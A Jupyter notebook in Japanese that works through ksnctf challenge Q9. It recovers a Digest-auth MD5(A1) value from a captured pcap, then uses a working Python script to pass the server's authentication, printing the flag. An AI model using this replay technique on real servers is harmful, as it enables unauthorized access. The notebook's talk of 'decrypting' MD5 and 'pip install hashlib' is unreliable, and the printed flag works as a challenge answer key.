{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Q9 Digest is secure!\n",
    "## 問題URL\n",
    "http://ksnctf.sweetduet.info/q/9/q9.pcap"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 概要\n",
    "pcapファイルが与えられる。  \n",
    "pcapファイルを開くと`49.212.153.157`に`GET /~q9/`メッセージを送り認証を要求されている様子が見られる。  \n",
    "認証を突破してサーバにアクセスすれば何とかなるのかなと思い、突破を試みる\n",
    "\n",
    "なお、pcapファイルないで`flag`の文字列を検索すると16番目のパケットで以下が見つかる。\n",
    "\n",
    "```\n",
    "Line-based text data: text/html\n",
    "    <!DOCTYPE html>\\n\n",
    "      <head>\\n\n",
    "        <meta charset=\"utf-8\">\\n\n",
    "        <title>Q9</title>\\n\n",
    "      </head>\\n\n",
    "      <body>\\n\n",
    "        <p>Congratulations!</p>\\n\n",
    "        <p>The flag is <a href=\"flag.html\">here</a>.</p>\\n\n",
    "      </body>\\n\n",
    "    </html>\\n\n",
    "```\n",
    "よって、/~q9/ にアクセスすればフラグが表示されることがわかる。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ダイジェスト認証\n",
    "pcapファイル9番目のパケットのHTTPヘッダをみると`WWW-Authenticate: Digest` の記述からダイジェスト認証であることがわかる。  \n",
    "ダイジェスト認証はチャレンジ＆レスポンス型の認証方式である。手順としては\n",
    "1. サーバがクライアントにランダムな文字列(nonce)を送る\n",
    "1. クライアントは受け取ったnonceと事前に共有した鍵を用いてresponseを計算し、サーバに送信する\n",
    "1. サーバは受け取ったresponseとローカルで計算した計算結果を比較する\n",
    "1. 計算結果が一致すれば、パスワードを知っている正規ユーザと判断し認証成功とする"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "responseは以下のようにして計算される。\n",
    "\n",
    "```\n",
    "A1 = ユーザ名 \":\" realm \":\" パスワード\n",
    "A2 = HTTPのメソッド \":\" コンテンツのURI\n",
    "response = MD5( MD5(A1) \":\" nonce \":\" nc \":\" cnonce \":\" qop \":\" MD5(A2) )\n",
    "```\n",
    "要するに、**要求されたnonceに対して正しいresponseを生成できれば認証を突破できる**はずである。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## response を計算する"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "我々はパスワードを知らないのでMD5(A1)の部分が計算できない。  \n",
    "そこで、pcapファイルのresponseからMD5(A1)を復号を試みる。  \n",
    "MD5は本来復号困難な一方向ハッシュ関数であるが、すでに突破方法が発見されている(よって脆弱！)。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### MD5(A1) の復号\n",
    "pcapファイルの14番目のパケットHTTPヘッダ内の`Authorization`の値は以下  \n",
    "`Digest username=\"q9\", realm=\"secret\", nonce=\"bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b\", uri=\"/~q9/\", algorithm=MD5, response=\"c3077454ecf09ecef1d6c1201038cfaf\", qop=auth, nc=00000001, cnonce=\"9691c249745d94fc\"`\n",
    "\n",
    "このうち、`response`の値を復号する。  \n",
    "MD5の復号はいくつかのwebサイトで利用可能な模様。今回は以下のサイトを用いた  \n",
    "http://md5decryption.com/  \n",
    "\n",
    "これにより次を得る。  \n",
    "`c627e19450db746b739f41b64097d449:bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b:00000001:9691c249745d94fc:auth:31e101310bcd7fae974b921eb148099c`\n",
    "\n",
    "| フィールド名 | 値 |\n",
    "| --- | --- |\n",
    "| MD5(A1) | c627e19450db746b739f41b64097d449|\n",
    "| nonce | bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b|\n",
    "| nc | 00000001 |\n",
    "| cnonce | 9691c249745d94fc |\n",
    "| qop | auth |\n",
    "| MD5(A2) | 31e101310bcd7fae974b921eb148099c |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "上記表をみるとGETリクエストのヘッダのフィールドがきちんと再生されていることがわかる。  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## フラグ取得スクリプト\n",
    "MD5(A1)を用いてダイジェスト認証を突破するスクリプトを作成する。  \n",
    "MD5の計算にはhashlibを用いるので`pip install hashlib` でインストールする。  \n",
    "なお、実行する前にhttp://ksnctf.sweetduet.info:10080/~q9/ へリクエストが到達するようにしておく必要があるので注意。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib\n",
    "import hashlib\n",
    "import urllib.error\n",
    "import urllib.request\n",
    "\n",
    "url = 'http://ksnctf.sweetduet.info:10080/~q9/flag.html'\n",
    "\n",
    "#md5 = hashlib.md5()\n",
    "username = \"q9\"\n",
    "realm = \"secret\"\n",
    "nonce = \"\"\n",
    "uri = \"/~q9/\"#flag.html\"\n",
    "algorithm = \"MD5\"\n",
    "response = \"\"\n",
    "qop = \"auth\"\n",
    "nc = \"00000001\"\n",
    "cnonce = \"9691c249745d94fc\"\n",
    "md5a1 = \"c627e19450db746b739f41b64097d449\"\n",
    "a2 = 'GET:' + uri\n",
    "\n",
    "def getNonce():\n",
    "    try:\n",
    "        data = urllib.request.urlopen(url)\n",
    "        html = data.read()\n",
    "    except urllib.error.HTTPError as e:\n",
    "        nonce = e.info()['WWW-Authenticate'].split('\"')[3]\n",
    "        return nonce\n",
    "\n",
    "def genMD5(str):\n",
    "    m = hashlib.md5()\n",
    "    bstr = str.encode()\n",
    "    m.update(bstr)\n",
    "    return m.hexdigest()\n",
    "\n",
    "def genResponse(nonce):\n",
    "    response = genMD5(md5a1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + genMD5(a2))\n",
    "    return response\n",
    "\n",
    "def genAuthorized(nonce, response):\n",
    "    authorized = 'Digest username=\"' + username + '\", realm=\"' + realm + '\", nonce=\"' + nonce + '\",uri=\"' + uri + '\", algorithm=' + algorithm + ', response=\"' + response + '\", qop=' + qop + ', nc=' + nc + ', cnonce=\"' + cnonce + '\"'\n",
    "    return authorized"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "まず、responseを計算するために必要なnonceを取得する。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "nonce = getNonce()\n",
    "response = genResponse(nonce)\n",
    "auth = genAuthorized(nonce, response)\n",
    "header = {'Authorization' : auth}\n",
    "req = urllib.request.Request(url, None, header)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'<!DOCTYPE html>\\n  <head>\\n    <meta charset=\"utf-8\">\\n    <title>Q9</title>\\n  </head>\\n  <body>\\n    <p>FLAG_YBLyivV4WEvC4pp3</p>\\n  </body>\\n</html>\\n'\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    data = urllib.request.urlopen(req)\n",
    "    html = data.read()\n",
    "    print(html)\n",
    "except urllib.error.HTTPError as e:\n",
    "    print(e.code)\n",
    "    print(e.info())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
